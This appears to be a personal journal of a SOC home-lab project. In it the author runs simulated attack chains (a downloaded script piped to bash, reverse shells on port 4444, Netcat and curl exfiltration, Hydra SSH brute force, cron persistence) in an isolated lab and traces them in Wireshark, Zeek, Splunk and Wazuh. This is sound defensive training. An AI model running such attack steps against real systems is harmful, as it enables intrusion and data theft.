I’m becoming much more comfortable building realistic offensive scenarios and then analyzing them from a defender’s perspective.

## Day 32 - Practice and practice and practice 
Date: November 19, 2025

Today I continued developing my SOC Home Lab by practicing two attack chains:
 
 1. The short 4-step chain (recon → reverse shell → pivoting → file exfiltration)
 
 2. The “real-world-style” chain (delivering a malicious script + command-and-control callback + exfiltration attempt)

Even though the second chain wasn’t fully captured by Zeek, I successfully executed most of the steps and validated them through Wireshark and Splunk.


## 🛠 1. Short Attack Chain — Full Success

I repeated the compact attack chain I learned yesterday, but this time much faster and more confidently.

## What I completed:

 • ICMP reconnaissance from Kali → victim
 
 • Reverse shell from victim → Kali

 • Port scanning from inside the victim (pivot stage)
 
 • File exfiltration using Netcat (working .txt file)

 • Full Wireshark inspection of:

 • SYN scans
 
 
 • ICMP Echo/Replies
 
 • Reverse shell traffic on port 4444
 
 • Exfiltrated file contents (visible in Follow TCP Stream)
 
 • Splunk confirmation using:
 
 • sourcetype=zeek (from earlier test)
 
 • stats count by id.orig_h, id.resp_h, resp_p
 
 • Time-aligned events for the exfiltration packet

## Important win:

I successfully located the exact TCP packet with the exfiltrated text, pulled it by timestamp from Splunk, and confirmed the raw file content in Wireshark.
This shows I’m learning to correlate network + SIEM — SOC Analyst core skill.


## 🛠 2. “Real-World” Attack Chain Attempt

This was more complex:
deliver a script → victim executes it → callback → optional exfiltration.

## What worked:


✔ Built helper_tool.sh manually

✔ Served it over HTTP from Kali (port 8080)

✔ Victim downloaded it with curl -O

✔ Script executed successfully

✔ Script printed fake “Installing system helper…” (malware simulation)

✔ Wireshark captured the HTTP GET request for helper_tool.sh

## What did NOT work today:


⚠ Zeek was not capturing → no Zeek logs in Splunk

⚠ Exfiltration stage not completed

⚠ Reverse shell callback failed because I forgot to open listener in time

But: all other stages worked exactly as expected.

## 🔍 3. Wireshark Traffic Analysis (Successful)

I inspected all key packets:

HTTP GET

GET /helper_tool.sh HTTP/1.1 — clearly visible with User-Agent curl/7.x

Reverse Shell Attempts

Traffic on:
 • Port 4444
 • Port 8080
 • Port 9001

Exfiltration analysis

Found the exact packet (Len=28) containing:

top top top secret info

Verified in:
 • Hex pane
 • ASCII pane
 • Full TCP Stream reconstruction

## Day 33 - Full attack chain inside the isolated SOC Home Lab
Date: November 20, 2025

Today I focused on validating my full attack chain inside the isolated SOC Home Lab, using Splunk, Zeek, Wireshark and manual command-line analysis.
This was the most complete and realistic end-to-end test so far.

## 🔹 1. Successful Data Exfiltration Chain

I repeated the full attack workflow:

 • Delivered and executed the helper_tool.sh script from Kali → victim Ubuntu
 
 • Established a reverse shell connection on port 4444
 
 • Generated a binary file (topsecret.bin) and exfiltrated it to Kali over port 9001
 
 • Verified file integrity with md5sum on both machines

Everything worked perfectly.

## 🔹 2. Network Traffic Analysis

I captured and analyzed all stages using both tools:

 • Wireshark → Identified TCP streams for 8080 (initial download), 4444 (reverse shell), 9001 (file exfiltration)
 
 • Used filters like tcp.port==9001 and tcp.stream==1269 to locate the exact transfer
 
 • Followed the TCP stream to see binary fragments of the exfiltrated file

 • Confirmed that the PCAP matched the Splunk/Zeek logs by timestamp

## 🔹 3. Zeek + Splunk Correlation

Zeek generated clean logs for:
 
 • Initial access (port 8080)
 
 • Reverse shell (port 4444)
 
 • Exfiltration (port 9001)

In Splunk I successfully correlated:
 
 • src_ip = 192.168.1.50
 
 • dest_ip = 192.168.1.125
 
 • orig_bytes = 204800 (exact file size!)
 
 • durations, connection flags, and protocol transitions

This confirmed Zeek was capturing the event correctly and Splunk was parsing fields normally (after minor renaming).

## 🔹 4. Dashboard Work (Partial)

I started building a multi-panel Splunk dashboard for:
 
 • Stage 3 summary (total exfil bytes)

 • Exfil timeline (port 9001)
 
 • Full chain overview

I still need to clean the XML and finish all panels → leaving this for another session.


📌 Overall Result

Today I completed my first full real-world attack chain in the lab with full visibility:


✔ Kali attacker

✔ Victim Ubuntu

✔ Reverse shell

✔ Lateral commands

✔ Data exfiltration

✔ Wireshark PCAP confirmation

✔ Zeek + Splunk correlation

✔ Hash validation of stolen file

## Day 34 - Full Attack Chain – Complete End-to-End Replication
Date: November 21, 2025

Today I successfully repeated the full attack chain scenario in my isolated SOC home lab. This included:

## 1. Reverse Shell (Port 4444)
 
 • Re-established a functional reverse shell from attacker (Kali) → victim (Ubuntu).
 
 • Verified full packet flow in Wireshark (tcp.stream analysis).
 
 • Confirmed Zeek detection (known_services.log, conn.log).
 
 • Splunk dashboard displayed real-time events with correct field mappings.

## 2. HTTP Tool Delivery (Port 8080)
 
 • Served helper_tool.sh from the attacker using Python HTTP server.
 
 • Victim downloaded it via curl (HTTP/1.1 200 OK).
 
 • Verified the activity in:
 
 • Wireshark (HTTP GET, MIME type text/x-shellscript)
 
 • Zeek HTTP logs
 
 • Splunk visualization panel

## 3. File Exfiltration (Port 9001)
 
 • Created two files on the victim:
 
 • .txt
 
 • .bin
 
 • Exfiltrated both to the attacker over TCP port 9001 using Netcat.
 
 • Verified:
 
 • Packet payloads in Wireshark (PSH+ACK with data)
 
 • File size correlation in Zeek (orig_bytes / resp_bytes)
 
 • Real-time Splunk dashboard updates
 
 • Recomputed MD5 on both sides → integrity confirmed.

## 4. Reconnaissance & Movement
 
 • Generated ICMP network scans + SSH activity to map sessions.
 
 • Observed scan traffic in Wireshark and Zeek.
 
 • Viewed SSH sessions (encrypted traffic) to validate MITRE mapping.

## 5. Dashboard Testing (Real-Time)

 • Built a simplified Splunk dashboard showing:
 
 • Port 4444 (reverse shell)
 
 • Port 8080 (HTTP transfer)
 
 • Port 9001 (exfiltration)
 
 • Ran the entire attack chain again → dashboard showed all stages in real time.


📘 MITRE ATT&CK Mapping Added to Notes

Today I finalized correct ATT&CK classification for each phase:
 
 • T1046 – Network Scanning
 
 • T1059 – Command Execution
 
 • T1105 – Ingress Tool Transfer
 
 • T1021.004 – Remote Services (SSH)
 
 • T1041 / T1048 – Data Exfiltration
 
 • T1078 / T1110 – Valid Accounts / Brute Force

This mapping will be used later for building detection rules and documentation

## Day 35-36  — New Host Laptop Setup & Integration
Date:November 24-25, 2025

## 🟩 1. Searching + Buying New Host Laptop
During these two days I focused on upgrading my main host machine.  
Key steps:
- Spent time comparing laptops (HP Pavilion vs ThinkPad models).
- Finally found and bought a ThinkPad T14 Gen 1 (Ryzen 5).
- Checked its hardware, installed RAM, and verified all ports (USB-C, HDMI, Ethernet).

## 🟩 2. Hardware Preparation
- Opened the laptop, cleaned dust, replaced thermal paste.
- Added an extra RAM module (temporary 4 GB → total 20 GB).
- Swapped the NVMe SSD from old HP → new ThinkPad.
- Verified temperatures, fans, and system stability.

## 🟩 3. Installing Linux Mint (New Host OS)
- Created bootable USB and installed Linux Mint as main OS.
- Completed initial updates, drivers, and system tweaks.
- Installed essential packages:
  - Terminal tools (htop, neofetch, networking tools)
  - Python + VS Code
  - SSH, OpenSSH Server
  - Git, Curl, QEMU support

## 🟩 4. Preparing the Host for the SOC Lab
- Configured all networking settings for isolated lab use.
- Ensured compatibility with:
  - Splunk Enterprise (indexer)
  - SSH access to Kali, Pi, and PC2
  - Multi-monitor setup for SOC workflow
- Tested ports, firewall, and routing behavior.
- Verified the ThinkPad works stable as the main SOC Host Machine.

## 🟩 5. Migration from Old Host Laptop
- Backed up VirtualBox VMs (optional storage).
- Moved all previous SOC project files.
- Confirmed everything needed for:
  - Splunk dashboards
  - Wireshark analysis
  - Proxmox Web management
  - Raspberry Pi capture workflow

## 🟢 Result (End of 25 November)
- New ThinkPad host fully installed, optimized, and integrated.
- Ready for reconnection with Proxmox, Kali, Pi, Splunk Enterprise, and PC2.
- System running fast, cool, and smooth → perfect for SOC workflows.


## Day 37 — Rebuilding Lab Connectivity & New Splunk Forwarder
Date:November 26, 2025 

### Goals
- Give the Proxmox server controlled access to the Internet without breaking the isolated lab network.
- Rebuild my Linux Mint “PC2” forwarder on an old ASUS laptop and connect it to Splunk.
- Make sure the lab can run with screens closed / headless when needed.

### Work Performed

#### 1. Proxmox server networking re-work (eno1 + eno2)
- Reviewed current network state on the Proxmox host:
  - ip a, ip route
  - Interfaces: eno1, eno2, eno3, eno4, and bridge vmbr0 (lab IP `192.168.1.10/24`).
- Goal:  
  - eno2 + vmbr0 → internal lab network (as before).  
  - eno1 → Internet via home router (same 192.168.1.0/24 subnet).
- Edited /etc/network/interfaces on the Proxmox host to:
  - Keep vmbr0 static: address 192.168.1.10/24, gateway 192.168.1.1, bridge-ports eno2.
  - Configure eno1 with DHCP:
       auto eno1
    iface eno1 inet dhcp
    - Restarted networking and validated:
  - ip a show eno1 → got a DHCP address from the router.
  - ip route → default route via eno1.
- Fixed DNS resolution:
  - Created /etc/resolv.conf or equivalent to use public DNS:
    - nameserver 1.1.1.1
    - nameserver 8.8.8.8
    - fallback 1.0.0.1
  - Verified:
    - ping 1.1.1.1 and ping 8.8.8.8 succeed.
    - ping google.com works again.
    - 
---

### 2. New Linux Mint forwarder on ASUS N71J (PC2)
- Picked up a used ASUS N71J laptop (no RAM/SSD/charger originally).
- Installed RAM + SSD I already had.
- Booted from USB and installed Linux Mint as the OS.
- Configured power management:
  - Turn off screen after inactivity.
  - Never suspend on AC.
  - Allow the laptop to keep running with the lid closed (good for SSH/headless use).
- Installed Splunk Universal Forwarder on PC2:
  - Enabled the service and checked status with:
       sudo /opt/splunkforwarder/bin/splunk status
      - Confirmed splunkd and helper processes are running.
- Configured the forwarder to send logs to my Splunk indexer on the host laptop.
- Verified in Splunk Web:
  - New events are arriving from:
    - Proxmox server (host)
    - PC2 (ASUS N71J Linux Mint)
  - Source types and hosts look as expected.

---

### 3. ThinkPad boot / PXE annoyance
- Sometimes the ThinkPad tried to PXE boot over IPv4 when the Ethernet cable was connected.
- Opened BIOS and:
  - Moved PXE boot entries to the Excluded from Boot Priority Order list.
  - Ensured the main boot order is:
    1. Ubuntu
    2. NVMe0
    3. Windows Boot Manager
- Result: laptop now boots straight into Ubuntu even with Ethernet plugged in.

---

### Results / Status
- Proxmox:
  - Has working Internet through eno1 while still serving the lab via eno2 + vmbr0.
  - Can update packages again and resolve DNS properly.
- PC2:
  - Linux Mint installed, configured, and running as a Splunk forwarder.
  - Can run with lid closed and be managed via SSH from the host.
- ThinkPad host:
  - Boot sequence is stable (no more PXE over IPv4 surprise when Ethernet is connected).

---

### Next Steps
- Add/verify a Zeek
- Clean up Splunk:
  - Tag and normalize hosts (`host=proxmox-server`, host=pc2-n71j, etc.).
  - Start building focused dashboards for:
    - Forwarder health
    - Network events from Proxmox and PC2

## Day 38 - Daily Lab Progress
Date:November 27, 2025

## 🟩 1. Proxmox Internet + Lab Network Fully Repaired
Today I finally fixed the long-standing problem where Proxmox lost internet every time I connected lab cables.

# 🟦 5. ATTACK CHAIN TESTING
Today I successfully executed two attack chains:

---

## 🔹 Attack Chain #1 — Short Version
- Recon → SSH brute-force → persistence → reverse shell
- Events captured in:
  - Splunk (SSH failures, successful login, process creation)
  - Pi tcpdump (network traffic)
  - Wireshark (packet-level detail)

---

## 🔹 Attack Chain #2 — Full Payload Chain
This was the main highlight of the day — a more realistic intrusion flow using a downloaded payload.

### Steps performed:
1. Initial Access (Social Engineering Simulation)
   - Victim downloaded a script:  
     helper/update_script.sh
   - Script created a directory and downloaded a malicious payload inside the victim machine.

2. Payload / Malware Deployment
   - Payload executed by the victim.
   - Created persistence directory.
   - Dropped reverse shell components.

3. Command & Control
   - Reverse shell established back to Kali on port 4444.
   - Attacker operated inside the victim.

4. Internal Recon
   - ifconfig, arp -a, netstat, directory listing.
   - Splunk: Events appeared correctly.

5. Lateral Movement
   - Attacker probed PC2 and other lab systems.

6. Data Exfiltration
   - Two files exfiltrated:  
     - 1x TXT  
     - 1x BIN  
   - Verified in Splunk via packet size and timestamp.
   - Found matching packet in Wireshark (line *694557*).

Everything was successfully detected in Splunk & Wireshark.  
Zeek logs will be added tomorrow after TA installation.

---

# 🟣 6. Additional Work
- Installed VS Code and optimized terminal tools.
- Configured ThinkPad dual-monitor setup (USB-C + HDMI).
- Set up SSH usage while PC2 lid is closed.
- Verified stable capturing on Raspberry Pi.

---

# 🟢 Overall Status (End of Day)
- ✅ Proxmox fixed  
- ✅ Pi sending captures  
- ✅ All Splunk forwarders online  
- ✅ Full attack chain completed (twice)  
- ✅ Payload chain working  
- ⚠️ Zeek TA still missing (install tomorrow)  
- ⚠️ Multi-panel dashboards pending  

---

# 🎯 Next Steps:
- Install Splunk TA for Zeek & verify field extractions.  
- Run the full payload chain again but with Zeek + Splunk dashboards.  
- Save and analyze PCAP in Wireshark (deep dive).  
- Strengthen dashboards for Recon → Execution → C2 → Exfiltration.  
- 30 min TryHackMe SOC rooms.

## Day 39 — SSH automation, running a full malicious attack chain, capturing all network evidence
Date:November 28, 2025

## 🔐 1. SSH Trust & Key Configuration Fixed

- Resolved the remote host identification error.
- Cleaned old fingerprints from ~/.ssh/known_hosts.
- Configured passwordless SSH using ED25519 keys.
- Verified that both SSH and SCP now work without password prompts.
- Automation scripts depending on SSH now work smoothly.


## 📡 2. Automatic PCAP Sync Working Perfectly

The script sync_latest_capture.sh now:

- Detects the newest .pcap file.
- Transfers it automatically to the host.
- Uses SSH key auth → no password required.
- Writes transfer logs correctly.


## ⚔️ 3. Full HTTP-Based Malware Attack Chain (Kali → PC2)

A complete multi-stage attack was executed:

1. Hosted malicious files (`helper1.sh`, `payload1.sh`) on Kali.
2. PC2 executed:
     curl http://192... | bash
   3. Helper script downloaded & ran payload.
4. Reverse shell opened on port 4444.
5. Fake secret data was created.
6. Exfiltration performed via port 9001.


## 🌐 4. PCAP and Zeek Logs Confirmed

Captured:

- HTTP requests
- Reverse shell traffic
- Exfiltration packets

Zeek logs forwarded:

- conn.log
- http.log
- dns.log


## ⚠️ 5. TA-Zeek Installed but Field Extraction Not Working

- Add-on installed.
- Forwarder sending zeek logs.
- Problem: Splunk shows TSV, no field extraction.

## Day 40 - New day - new experience
Date: November 30, 2025  

Today was one of the longest and most intense work sessions in my entire SOC Home Lab journey. I spent 8 full hours configuring, testing, troubleshooting, breaking, fixing, and validating multiple components of my offline environment. Even with unexpected issues, the session ended successfully with valuable experience gained.

## 🔧 1. Wazuh Agent & System Recovery

### 🔥 Critical Issue: /etc/passwd Corruption  
While testing a command, the system attempted to overwrite /etc/passwd, causing:
- Loss of user account visibility  
- sudo failing with “you do not exist in the passwd database”  
- Wazuh agent failing to start (“Invalid user 'wazuh' or group 'wazuh'”)  
- SSH refusing connections  
- System booting into read-only recovery mode

### 🛠 Recovery Steps
I fully recovered PC2 using real sysadmin techniques:
- Booted into Recovery Mode
- Remounted filesystem:
- Restored:
- /etc/passwd from /etc/passwd-
- /etc/shadow from /etc/shadow-
- Repaired file permissions  
- Rebooted successfully  
- Confirmed working login + sudo access  
- Restarted and verified Wazuh agent

This was a very realistic real-world troubleshooting experience, similar to what SOC/IT teams face during incidents.

## 🌐 2. Network & Device Stabilization

- Raspberry Pi reverted to DHCP; reconfigured to static 192.168.1.18
- Verified all hosts inside the offline lab:
- Kali  
- PC2  
- Pi  
- ThinkPad  
- Proxmox VMs  
- Ensured proper communication between devices  
- Confirmed SSH functionality and Splunk/Wazuh connectivity

## 🛡 3. Attack Simulations & Detection Testing

Performed multiple attack steps to generate security alerts:

### ✔ SSH Brute Force Simulation  
Detected in Wazuh as:
- Failed password attempts  
- Authentication failures  
- Credential guessing  
- MITRE mappings: T1110 (Brute Force)

### ✔ Web Server Probing  
Tested via browser/manual requests (404 / 405 error generation).  
Wazuh detected:
- Apache access logs  
- Web error codes  
- Nmap Scripting Engine user-agent  
- MITRE mapping: Initial Access → Reconnaissance

### ✔ Unauthorized Command Execution Detection  
Executed:

Wazuh correctly flagged it as:
- Privilege escalation attempt  
- Unauthorized system file modification  
- “First time user executed sudo”  
- MITRE mappings:  
  - Credential Access  
  - Persistence  
  - Privilege Escalation  
  - Lateral Movement

### 📊 Confirmed all logs are visible under:
- wazuh-alerts-*

This validated that the agent fully works after restoration.


## 📈 4. Real SOC-Level Learning

- Real-world troubleshooting  
- Full OS recovery  
- Understanding sensitive system files  
- Wazuh agent behavior  
- Log generation  
- Event correlation  
- Attack chain visibility  
- Hands-on SIEM workflow


## 📝 5. Final Notes

Today I achieved deep technical progress across:
- System administration  
- Wazuh configuration  
- Log analysis  
- Offense/Defense testing  
- Network stability  
- Incident recovery  
- Attack chain documentation

Even after breaking part of the system, I successfully restored everything and continued working until the lab was fully operational again.

Tomorrow’s goals:
- Add missing auditd/sysmon monitoring rules in Wazuh  
- Create structured attack chain documentation  
- Trigger new events and analyze them  
- Prepare notes for future SOC interviews

## Day 41 - MITRE
Date: December 1, 2025
  
I spent many hours working on Wazuh rule customization, trying to map my simulated attack chain to the MITRE ATT&CK framework using custom local_rules.xml.

### 🔧 What I worked on
- Troubleshooting Wazuh configuration errors caused by invalid XML syntax.
- Learning how the manager validates rules and rejects incorrect attributes.
- Successfully updating the Wazuh repository and verifying version integrity.
- Creating and testing my first working custom MITRE rule for detecting cron persistence:
  - Technique: T1053.003 (Cron)
  - Triggered correctly after simulating a malicious cron modification.
- Investigated other attack steps: netcat exfiltration, SSH intrusion, privilege escalation.
- Identified which techniques require:
  - Custom decoders  
  - Regex adjustments  
  - Or deeper log visibility

### 🧪 Attack chain tested today
I executed a full attack simulation:
- Nmap scan from Kali  
- SSH intrusion  
- Privilege escalation  
- Cron persistence backdoor  
- Data exfiltration with nc  

Wazuh successfully detected:
- SSH login activity  
- Sudo privilege changes  
- Cron-based persistence (custom rule working!)  

Still pending detection:
- Netcat exfiltration (T1048)  
- Some lateral movement and manipulation steps

### 🧠 What I learned
- Wazuh is extremely strict with XML — one wrong tag breaks the entire manager.
- MITRE mappings must follow the correct <mitre><id>…</id></mitre> format.
- Custom detection is possible, but it requires:
  - Understanding how Wazuh decoders parse logs  
  - Matching the right SID  
  - Building rules step-by-step, testing each one  

### 📌 Next steps (Tomorrow)
- Create reliable custom rules for:
  - T1048 — Data Exfiltration (Netcat)
  - Additional privilege escalation steps
  - Command monitoring for attacker TTPs  
- Add missing log visibility on PC2 for better detection.  
- Build a clean set of reusable MITRE rules for future attacks.

Despite how exhausting today was, I finished with a working MITRE rule and a better understanding of Wazuh internals.

## Day 42 - First Report
Date: December 2, 2025

Today was one of the most productive sessions in my SOC Level 1 training so far. I completed a full end-to-end attack chain inside my offline SOC lab, validated traffic visibility across all layers, tested detections in Splunk and Wazuh, collected network forensics using Zeek and Wireshark, and finished my first complete SOC incident report based on real evidence.

This session combined offensive testing + defensive monitoring + forensic analysis + reporting, giving me a complete real-world SOC workflow experience.


## 🔥 1. Attack Chain Execution (Kali → PC2 Ubuntu)

I executed the full chain from the attacker machine (Kali 192.168.1.) against PC2 (192.168.1.), all performed inside my isolated home lab.

## Steps executed:
 
 • Nmap network discovery (T1046)
 • Nmap service scan (T1046/T1045)
 • Hydra SSH brute-force on PC2 (T1110)
 • Successful SSH login using brute-forced credentials (T1078)
 • Sudo privilege escalation check (T1069)
 • Malicious file download using wget (T1105)
 • Data exfiltration using curl HTTP POST (T1041)

## 📡 2. Capture & Monitoring Setup (Zeek, tcpdump, Wireshark)

Before starting the attack, I launched:
 • Zeek on my Raspberry Pi sensor to capture structured logs
 • tcpdump to record a full PCAP for Wireshark analysis
 • Wireshark later to analyze encrypted SSH, Nmap phases, HTTP GET/POST, and connections

## 📊 3. SIEM Visibility (Splunk)

Splunk received logs from PC2 and correctly indexed all major stages:
 • Failed SSH logins (Hydra brute-force)
 • Successful SSH login by attacker
 • sudo activity performed after compromise
 • wget download visible from shell history + syslog
 • curl exfiltration also visible
 • Timestamps aligned with Zeek and Wireshark data

## 🛡️ 4. Wazuh Visibility (Host-Based Detection)

Wazuh detected several important parts of the attack chain:
 • SSH brute-force attempts
 • Successful SSH authentication
 • sudo privilege escalation attempt
 • wget / curl command execution logs

Some parts (like exfiltration detection, Nmap, persistence, or tool transfer details) require custom rule creation, which I will configure in future sessions.

## 🔍 5. Forensic Analysis (Wireshark + Zeek Logs)

In Wireshark I analyzed:
 • Nmap scan patterns (SYN, ICMP, ARP)
 • SSH brute-force handshake loops
 • Full SSH session establishment
 • HTTP GET request for payload download
 • HTTP POST exfiltration including visible payload size
 • Packet length, streams, seq/ack timeline

Zeek validated all of this with:
 • conn.log: connection states and timing
 • http.log: GET and POST events
 • ssh.log: authentication attempts
 • notice.log: scanning behaviors (where applicable)

## 🧩 6. MITRE Technique Mapping

I mapped every stage to ATT&CK:
 • T1046 — Network Discovery
 • T1110 — Brute Force
 • T1078 — Valid Accounts
 • T1069 — Privilege Escalation
 • T1105 — Ingress Tool Transfer
 • T1041 — Data Exfiltration Over C2/HTTP

## 📝 7. Reporting Work

I wrote my first complete SOC incident report, including:
 • Executive summary
 • Full timeline
 • MITRE mapping
 • Splunk findings
 • Wazuh detections
 • Zeek + Wireshark evidence
 • Impact analysis
 • Recommendations

## Day 43 - Attack Chain + Wazuh Fix + Custom Detections
Date: December 6, 2025

### 1️⃣ Attack Chain Executed
- Nmap recon and service discovery  
- SSH brute-force simulation (Hydra)  
- Successful SSH access  
- Post-compromise commands (bash, wget, curl)  
- Data exfiltration test  
- Traffic captured and analyzed in Wireshark + Splunk  

### 2️⃣ Initial Detection Issues
- Wazuh not showing alerts  
- auditd logs missing or incomplete  
- local_rules.xml syntax errors  
- Custom rules not loading  
- No MITRE mapping visible  

### 3️⃣ Fixes Performed
- Rebuilt local_rules.xml with correct XML structure  
- Added MITRE tags, rule groups, descriptions  
- Removed invalid regex and simplified matching  
- Restarted Wazuh Manager → no errors in ossec.log  
- Confirmed custom rules load correctly  

### 4️⃣ Custom Rule Detections Working
Wazuh now generates alerts for:
- Suspicious command execution (`wget`, curl, `python3`) → MITRE T1059  
- Netcat exfiltration rule structure functional → MITRE T1048  
- Cron persistence rule loaded → MITRE T1053.003  

Alerts appear in wazuh-alerts-* with:
- rule.id  
- rule.level  
- rule.description  
- MITRE technique metadata  
- Full audit/command log context  

### 5️⃣ Key Takeaways
- auditd parent SIDs must trigger before custom rules  
- XML errors break the entire ruleset  
- Netcat may not produce audit logs → needs separate detection method  
- First successful custom Wazuh detections working end-to-end
